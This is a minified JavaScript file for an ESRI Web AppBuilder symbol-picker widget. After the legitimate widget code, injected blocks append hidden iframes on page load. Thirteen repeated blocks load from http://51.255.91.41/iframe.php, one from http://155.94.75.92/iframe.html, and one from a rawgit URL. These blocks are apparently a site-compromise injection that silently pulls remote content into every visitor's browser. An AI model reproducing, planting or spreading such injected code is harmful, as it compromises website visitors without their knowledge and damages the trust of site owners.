// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare jimu/BaseWidget dojo/_base/lang dojo/on dojo/dom-construct dojo/_base/array jimu/symbolUtils esri/symbols/jsonUtils dijit/popup dijit/TooltipDialog dojo/_base/html".split(" "),function(g,h,b,d,c,k,l,m,e,n,p){return g([h],{_tooltipDialog:null,selectedSymbol:null,symbolData:[],constructor:function(a){b.mixin(this,a)},postCreate:function(){this.symbolData||(this.symbolData=[]);this._createSelectedSymbolNode();this._hideTooltipDialog();this.symbolData&&0<this.symbolData.length&&
(this._createTooltipDialog(),this.selectSymbol(this.symbolData[0]));this.own(d(document.body,"click",b.hitch(this,function(a){this.isPartOfPopup(a.target||a.srcElement)||this._hideTooltipDialog()})))},setDefault:function(){this.selectSymbol(this.symbolData[0])},_createSelectedSymbolNode:function(){var a=c.create("div",{},this.domNode);this.selectedSymbolNode=c.create("div",{"class":"esriCTSelectedSymbol"},a)},_createTooltipDialog:function(){var a=this._createSymbolListMenu();this._tooltipDialog=new n({content:a,
"class":"esriCTSymbolPopup"});this.own(d(this.domNode,"click",b.hitch(this,function(a){a.stopPropagation();a.preventDefault();this._isTooltipDialogOpened?this._hideTooltipDialog():this._showTooltipDialog()})));this.own(d(document.body,"click",b.hitch(this,function(a){this.isPartOfPopup(a.target||a.srcElement)||this._hideTooltipDialog()})))},_createSymbolListMenu:function(){var a,f;a=c.create("div",{"class":"esriCTSymbolListContainer"},null);f=c.create("div",{"class":"esriCTSymbolListContent"},a);
k.forEach(this.symbolData,b.hitch(this,function(a){var b,d;b=c.create("div",{"class":"esriCTSymbolOption",title:a.label},f);this._attachRowClick(b,a);d=c.create("div",{"class":"esriCTSymbolIcon"},b);c.create("div",{"class":"esriCTSymbolName",innerHTML:a.label},b);b=c.create("div",{},d);this._createSymbol(a,b)}));return a},_attachRowClick:function(a,c){this.own(d(a,"click",b.hitch(this,function(){this.selectSymbol(c);this.hideOnSelect&&this._hideTooltipDialog()})))},_createSymbol:function(a,b){a&&
(a=m.fromJson(a.symbol),(a=l.createSymbolNode(a))||(a=c.create("div")),c.place(a,b))},selectSymbol:function(a){c.empty(this.selectedSymbolNode);this.selectedSymbol={label:a.label||a.type,type:a.type,symbol:a.symbol};this._createSymbol(this.selectedSymbol,this.selectedSymbolNode);this.onSelect(a)},destroy:function(){e.close(this._tooltipDialog);this._tooltipDialog.destroy();this.inherited(arguments)},isPartOfPopup:function(a){var b;b=this._tooltipDialog.domNode;return a===b||p.isDescendant(a,b)},onSelect:function(a){return a},
_showTooltipDialog:function(){e.open({parent:this.getParent(),popup:this._tooltipDialog,around:this.domNode,"class":"esriCTSymbolPopup"});this._isTooltipDialogOpened=!0},_hideTooltipDialog:function(){e.close(this._tooltipDialog);this._isTooltipDialogOpened=!1}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});